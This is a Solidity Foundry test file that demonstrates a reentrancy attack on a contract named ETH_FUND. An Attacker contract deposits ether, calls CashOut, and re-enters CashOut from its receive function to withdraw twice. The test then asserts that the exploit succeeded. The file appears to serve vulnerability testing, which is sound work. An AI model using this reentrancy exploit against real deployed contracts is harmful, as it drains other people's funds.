
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_FUND, Log} from "../src/ETH_FUND.sol";

contract TestReentrancyETH_FUND is Test {

    ETH_FUND public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        Log transferLog = new Log();
        _contractUnderTest = new ETH_FUND(address(transferLog));
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal > 1 ether / 2);
        vm.assume(attackVal <= type(uint128).max);
        vm.assume(attackVal > 0);
        

        // --- 2. State Configuration (Pre-Condition) ---

        // --- 3. Funding ---
        
        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);
        
        _attacker.setupAttack{value: attackVal}(attackVal);
        vm.roll(block.number + 1);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_FUND public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackAmount;

    constructor(address victimAddress) { 
        victim = ETH_FUND(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        victim.Deposit{value: val * 2}();
    }

    function attack(uint256 val) public {
        attackAmount = val;
        initialSnapshot = address(this).balance;
        victim.CashOut(val);
        if (address(this).balance >= initialSnapshot + val * 2 && attackCallCount == 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.CashOut(attackAmount);
        }
    }
}
